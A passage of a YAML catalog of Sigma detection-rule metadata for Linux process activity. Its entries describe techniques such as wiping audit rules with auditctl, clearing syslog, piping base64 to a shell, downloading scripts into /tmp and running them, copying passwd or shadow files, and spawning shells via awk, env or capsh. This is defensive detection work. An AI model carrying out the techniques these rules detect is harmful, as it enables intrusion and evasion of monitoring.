  - attack.persistence
  - attack.t1053.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1053.002/T1053.002.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: bed26dea-4525-47f4-b24a-76e30e44ffb0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_auditctl_clear_rules.yml
  name: Audit Rules Deleted Via Auditctl
  description: 'Detects the execution of ''auditctl'' with the ''-D'' command line
    parameter, which deletes all configured audit rules and watches on Linux systems.

    This technique is commonly used by attackers to disable audit logging and cover
    their tracks by removing monitoring capabilities.

    Removal of audit rules can significantly impair detection of malicious activities
    on the affected system.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.012
  tags:
  - attack.defense-evasion
  - attack.t1562.012
  time_window: ''
  references:
  - https://www.atomicredteam.io/atomic-red-team/atomics/T1562.012
  - https://linux.die.net/man/8/auditct
  false_positives:
  - An administrator troubleshooting. Investigate all attempts.
  notes: ''
- detection_id: 36388120-b3f1-4ce9-b50b-280d9a7f4c04
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_av_kaspersky_av_disabled.yml
  name: Kaspersky Endpoint Security Stopped Via CommandLine - Linux
  description: 'Detects execution of the Kaspersky init.d stop script on Linux systems
    either directly or via systemctl.

    This activity may indicate a manual interruption of the antivirus service by an
    administrator, or it could be a sign of potential tampering or evasion attempts
    by malicious actors.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1562.001
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://support.kaspersky.com/KES4Linux/12.0.0/en-US/197929.htm
  false_positives:
  - System administrator manually stopping Kaspersky services
  notes: ''
- detection_id: 8c1a5675-cb85-452f-a298-b01b22a51856
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_awk_shell_spawn.yml
  name: Suspicious Invocation of Shell via AWK - Linux
  description: 'Detects the execution of "awk" or it''s sibling commands, to invoke
    a shell using the system() function.

    This behavior is commonly associated with attempts to execute arbitrary commands
    or escalate privileges, potentially leading to unauthorized access or further
    exploitation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/awk/#shell
  - https://gtfobins.github.io/gtfobins/gawk/#shell
  - https://gtfobins.github.io/gtfobins/nawk/#shell
  - https://gtfobins.github.io/gtfobins/mawk/#shell
  false_positives:
  - Unknown
  notes: ''
- detection_id: e2072cab-8c9a-459b-b63c-40ae79e27031
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_base64_decode.yml
  name: Decode Base64 Encoded Text
  description: Detects usage of base64 utility to decode arbitrary base64-encoded
    text
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1027/T1027.md
  false_positives:
  - Legitimate activities
  notes: ''
- detection_id: ba592c6d-6888-43c3-b8c6-689b8fe47337
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_base64_execution.yml
  name: Linux Base64 Encoded Pipe to Shell
  description: Detects suspicious process command line that uses base64 encoded input
    for execution with a shell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1140
  tags:
  - attack.defense-evasion
  - attack.t1140
  time_window: ''
  references:
  - https://github.com/arget13/DDexec
  - https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: fe2f9663-41cb-47e2-b954-8a228f3b9dff
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml
  name: Linux Base64 Encoded Shebang In CLI
  description: Detects the presence of a base64 version of the shebang in the commandline,
    which could indicate a malicious payload about to be decoded
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1140
  tags:
  - attack.defense-evasion
  - attack.t1140
  time_window: ''
  references:
  - https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html
  - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 6104e693-a7d6-4891-86cb-49a258523559
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_bash_interactive_shell.yml
  name: Bash Interactive Shell
  description: Detects execution of the bash shell with the interactive flag "-i".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  - https://www.revshells.com/
  - https://linux.die.net/man/1/bash
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7692f583-bd30-4008-8615-75dab3f08a99
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_bpf_kprob_tracing_enabled.yml
  name: Enable BPF Kprobes Tracing
  description: Detects common command used to enable bpf kprobes tracing
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - attack.defense-evasion
  time_window: ''
  references:
  - https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/
  - https://bpftrace.org/
  - https://www.kernel.org/doc/html/v5.0/trace/kprobetrace.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: f8341cb2-ee25-43fa-a975-d8a5a9714b39
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_bpftrace_unsafe_option_usage.yml
  name: BPFtrace Unsafe Option Usage
  description: Detects the usage of the unsafe bpftrace option
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.004
  tags:
  - attack.execution
  - attack.t1059.004
  time_window: ''
  references:
  - https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/
  - https://bpftrace.org/
  false_positives:
  - Legitimate usage of the unsafe option
  notes: ''
- detection_id: d8d97d51-122d-4cdd-9e2f-01b4b4933530
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_capa_discovery.yml
  name: Capabilities Discovery - Linux
  description: Detects usage of "getcap" binary. This is often used during recon activity
    to determine potential binaries that can be abused as GTFOBins or other.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1083
  tags:
  - attack.discovery
  - attack.t1083
  time_window: ''
  references:
  - https://github.com/SaiSathvik1/Linux-Privilege-Escalation-Notes
  - https://github.com/carlospolop/PEASS-ng
  - https://github.com/diego-treitos/linux-smart-enumeration
  false_positives:
  - Unknown
  notes: ''
- detection_id: db1ac3be-f606-4e3a-89e0-9607cbe6b98a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_capsh_shell_invocation.yml
  name: Capsh Shell Invocation - Linux
  description: 'Detects the use of the "capsh" utility to invoke a shell.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/capsh/#shell
  - https://www.elastic.co/guide/en/security/current/linux-restricted-shell-breakout-via-linux-binary-s.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 34979410-e4b5-4e5d-8cfb-389fdff05c12
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_chattr_immutable_removal.yml
  name: Remove Immutable File Attribute
  description: Detects usage of the 'chattr' utility to remove immutable file attribute.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1222.002
  tags:
  - attack.defense-evasion
  - attack.t1222.002
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/22/i/how-malicious-actors-abuse-native-linux-tools-in-their-attacks.html
  false_positives:
  - Administrator interacting with immutable files (e.g. for instance backups).
  notes: ''
- detection_id: f2bed782-994e-4f40-9cd5-518198cb3fba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_chroot_execution.yml
  name: Linux Sudo Chroot Execution
  description: 'Detects the execution of ''sudo'' command with ''--chroot'' option,
    which is used to change the root directory for command execution.

    Attackers may use this technique to evade detection and execute commands in a
    modified environment.

    This can be part of a privilege escalation strategy, as it allows the execution
    of commands with elevated privileges in a controlled environment as seen in CVE-2025-32463.

    While investigating, look out for unusual or unexpected use of ''sudo --chroot''
    in conjunction with other commands or scripts such as execution from temporary
    directories or unusual user accounts.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - attack.privilege-escalation
  - attack.t1068
  time_window: ''
  references:
  - https://github.com/kh4sh3i/CVE-2025-32463/blob/81bb430f84fa2089224733c3ed4bfa434c197ad4/exploit.sh
  false_positives:
  - Legitimate administrative tasks or scripts that use 'sudo --chroot' for containerization,
    testing, or system management.
  notes: ''
- detection_id: 80915f59-9b56-4616-9de0-fd0dea6c12fe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_clear_logs.yml
  name: Clear Linux Logs
  description: Detects attempts to clear logs on the system. Adversaries may clear
    system logs to hide evidence of an intrusion
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: stable
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.002
  tags:
  - attack.defense-evasion
  - attack.t1070.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.002/T1070.002.md
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 3fcc9b35-39e4-44c0-a2ad-9e82b6902b31
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_clear_syslog.yml
  name: Syslog Clearing or Removal Via System Utilities
  description: 'Detects specific commands commonly used to remove or empty the syslog.
    Which is a technique often used by attacker as a method to hide their tracks

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.002
  tags:
  - attack.defense-evasion
  - attack.t1070.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.002/T1070.002.md
  - https://www.virustotal.com/gui/file/54d60fd58d7fa3475fa123985bfc1594df26da25c1f5fbc7dfdba15876dd8ac5/behavior
  false_positives:
  - Log rotation.
  - Maintenance.
  notes: ''
- detection_id: ec127035-a636-4b9a-8555-0efd4e59f316
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_clipboard_collection.yml
  name: Clipboard Collection with Xclip Tool
  description: 'Detects attempts to collect data stored in the clipboard from users
    with the usage of xclip tool. Xclip has to be installed.

    Highly recommended using rule on servers, due to high usage of clipboard utilities
    on user workstations.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1115
  tags:
  - attack.collection
  - attack.t1115
  time_window: ''
  references:
  - https://www.packetlabs.net/posts/clipboard-data-security/
  false_positives:
  - Legitimate usage of xclip tools.
  notes: ''
- detection_id: fa4aaed5-4fe0-498d-bbc0-08e3346387ba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_cp_passwd_or_shadow_tmp.yml
  name: Copy Passwd Or Shadow From TMP Path
  description: Detects when the file "passwd" or "shadow" is copied from tmp path
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.001
  tags:
  - attack.credential-access
  - attack.t1552.001
  time_window: ''
  references:
  - https://blogs.blackberry.com/
  - https://twitter.com/Joseliyo_Jstnk/status/1620131033474822144
  false_positives:
  - Unknown
  notes: ''
- detection_id: 403ed92c-b7ec-4edd-9947-5b535ee12d46
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_crontab_enumeration.yml
  name: Crontab Enumeration
  description: Detects usage of crontab to list the tasks of the user
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1007
  tags:
  - attack.discovery
  - attack.t1007
  time_window: ''
  references:
  - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html
  - https://jstnk9.github.io/jstnk9/research/GobRAT-Malware/
  - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection
  - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection
  false_positives:
  - Legitimate use of crontab
  notes: ''
- detection_id: c2e234de-03a3-41e1-b39a-1e56dc17ba67
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_crontab_removal.yml
  name: Remove Scheduled Cron Task/Job
  description: 'Detects usage of the ''crontab'' utility to remove the current crontab.

    This is a common occurrence where cryptocurrency miners compete against each other
    by removing traces of other miners to hijack the maximum amount of resources possible

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/22/i/how-malicious-actors-abuse-native-linux-tools-in-their-attacks.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9069ea3c-b213-4c52-be13-86506a227ab1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_crypto_mining.yml
  name: Linux Crypto Mining Indicators
  description: Detects command line parameters or strings often used by crypto miners
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1496
  tags:
  - attack.impact
  - attack.t1496
  time_window: ''
  references:
  - https://www.poolwatch.io/coin/monero
  false_positives:
  - Legitimate use of crypto miners
  notes: ''
- detection_id: ea34fb97-e2c4-4afb-810f-785e4459b194
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_curl_usage.yml
  name: Curl Usage on Linux
  description: Detects a curl process start on linux, which indicates a file download
    from a remote location or a simple web request to a remote server
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/22/i/how-malicious-actors-abuse-native-linux-tools-in-their-attacks.html
  false_positives:
  - Scripts created by developers and admins
  - Administrative activity
  notes: ''
- detection_id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_curl_wget_exec_tmp.yml
  name: Suspicious Download and Execute Pattern via Curl/Wget
  description: 'Detects suspicious use of command-line tools such as curl or wget
    to download remote

    content - particularly scripts - into temporary directories (e.g., /dev/shm, /tmp),
    followed by

    immediate execution, indicating potential malicious activity. This pattern is
    commonly used

    by malicious scripts, stagers, or downloaders in fileless or multi-stage Linux
    attacks.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: experimental
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.004
  - T1203
  tags:
  - attack.execution
  - attack.t1059.004
  - attack.t1203
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/wget/
  - https://gtfobins.github.io/gtfobins/curl/
  false_positives:
  - System update scripts using temporary files
  - Installer scripts or automated provisioning tools
  notes: ''
- detection_id: 2953194b-e33c-4859-b9e8-05948c167447
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_dd_file_overwrite.yml
  name: DD File Overwrite
  description: Detects potential overwriting and deletion of a file using DD.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  tags:
  - attack.impact
  - attack.t1485
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1485/T1485.md#atomic-test-2---macoslinux---overwrite-file-with-dd
  false_positives:
  - Any user deleting files that way.
  notes: ''
- detection_id: 4cad6c64-d6df-42d6-8dae-eb78defdc415
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_dd_process_injection.yml
  name: Potential Linux Process Code Injection Via DD Utility
  description: Detects the injection of code by overwriting the memory map of a Linux
    process using the "dd" Linux command.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055.009
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055.009
  time_window: ''
  references:
  - https://www.aon.com/cyber-solutions/aon_cyber_labs/linux-based-inter-process-code-injection-without-ptrace2/
  - https://github.com/AonCyberLabs/Cexigua/blob/34d338620afae4c6335ba8d8d499e1d7d3d5d7b5/overwrite.sh
  false_positives:
  - Unknown
  notes: ''
- detection_id: 84c9e83c-599a-458a-a0cb-0ecce44e807a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_disable_ufw.yml
  name: Ufw Force Stop Using Ufw-Init
  description: Detects attempts to force stop the ufw using ufw-init
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://blogs.blackberry.com/
  - https://twitter.com/Joseliyo_Jstnk/status/1620131033474822144
  false_positives:
  - Network administrators
  notes: ''
- detection_id: 067d8238-7127-451c-a9ec-fa78045b618b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_doas_execution.yml
  name: Linux Doas Tool Execution
  description: Detects the doas tool execution in linux host platform. This utility
    tool allow standard users to perform tasks as root, the same way sudo does.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: stable
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1548
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548
  time_window: ''
  references:
  - https://research.splunk.com/endpoint/linux_doas_tool_execution/
  - https://www.makeuseof.com/how-to-install-and-use-doas/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: bed978f8-7f3a-432b-82c5-9286a9b3031a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_env_shell_invocation.yml
  name: Shell Invocation via Env Command - Linux
  description: 'Detects the use of the env command to invoke a shell. This may indicate
    an attempt to bypass restricted environments, escalate privileges, or execute
    arbitrary commands.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://gtfobins.github.io/gtfobins/env/#shell
  - https://www.elastic.co/guide/en/security/current/linux-restricted-shell-breakout-via-linux-binary-s.html
  false_positives:
  - Github operations such as ghe-backup
  notes: ''
- detection_id: 33e814e0-1f00-4e43-9c34-31fb7ae2b174
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_network_discovery.yml
  name: ESXi Network Configuration Discovery Via ESXCLI
  description: Detects execution of the "esxcli" command with the "network" flag in
    order to retrieve information about the network configuration.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1007
  - T1033
  - T1059.012
  tags:
  - attack.discovery
  - attack.execution
  - attack.t1033
  - attack.t1007
  - attack.t1059.012
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/
  - https://developer.broadcom.com/xapis/esxcli-command-reference/7.0.0/namespace/esxcli_network.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 9691f58d-92c1-4416-8bf3-2edd753ec9cf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_permission_change_admin.yml
  name: ESXi Admin Permission Assigned To Account Via ESXCLI
  description: Detects execution of the "esxcli" command with the "system" and "permission"
    flags in order to assign admin permissions to an account.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.012
  - T1098
  tags:
  - attack.persistence
  - attack.execution
  - attack.privilege-escalation
  - attack.t1059.012
  - attack.t1098
  time_window: ''
  references:
  - https://developer.broadcom.com/xapis/esxcli-command-reference/7.0.0/namespace/esxcli_system.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: f41dada5-3f56-4232-8503-3fb7f9cf2d60
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_storage_discovery.yml
  name: ESXi Storage Information Discovery Via ESXCLI
  description: Detects execution of the "esxcli" command with the "storage" flag in
    order to retrieve information about the storage status and other related information.
    Seen used by malware such as DarkSide and LockBit.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1007
  - T1033
  - T1059.012
  tags:
  - attack.discovery
  - attack.execution
  - attack.t1033
  - attack.t1007
  - attack.t1059.012
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/21/e/darkside-linux-vms-targeted.html
  - https://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html
  - https://developer.broadcom.com/xapis/esxcli-command-reference/7.0.0/namespace/esxcli_storage.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: 38eb1dbb-011f-40b1-a126-cf03a0210563
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_syslog_config_change.yml
  name: ESXi Syslog Configuration Change Via ESXCLI
  description: Detects changes to the ESXi syslog configuration via "esxcli"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.012
  - T1562.001
  - T1562.003
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1562.001
  - attack.t1562.003
  - attack.t1059.012
  time_window: ''
  references:
  - https://support.solarwinds.com/SuccessCenter/s/article/Configure-ESXi-Syslog-to-LEM?language=en_US
  - https://developer.broadcom.com/xapis/esxcli-command-reference/7.0.0/namespace/esxcli_system.html
  false_positives:
  - Legitimate administrative activities
  notes: ''
- detection_id: e80273e1-9faf-40bc-bd85-dbaff104c4e9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_system_discovery.yml
  name: ESXi System Information Discovery Via ESXCLI
  description: Detects execution of the "esxcli" command with the "system" flag in
    order to retrieve information about the different component of the system. Such
    as accounts, modules, NTP, etc.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1007
  - T1033
  - T1059.012
  tags:
  - attack.discovery
  - attack.execution
  - attack.t1033
  - attack.t1007
  - attack.t1059.012
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/
  - https://developer.broadcom.com/xapis/esxcli-command-reference/7.0.0/namespace/esxcli_system.html
  false_positives:
  - Legitimate administration activities
  notes: ''
- detection_id: b28e4eb3-8bbc-4f0c-819f-edfe8e2f25db
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/linux/process_creation/proc_creation_lnx_esxcli_user_account_creation.yml
  name: ESXi Account Creation Via ESXCLI
  description: Detects user account creation on ESXi system via esxcli
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.012
  - T1136
  tags:
  - attack.persistence
  - attack.execution
  - attack.t1136
  - attack.t1059.012
  time_window: ''
  references:
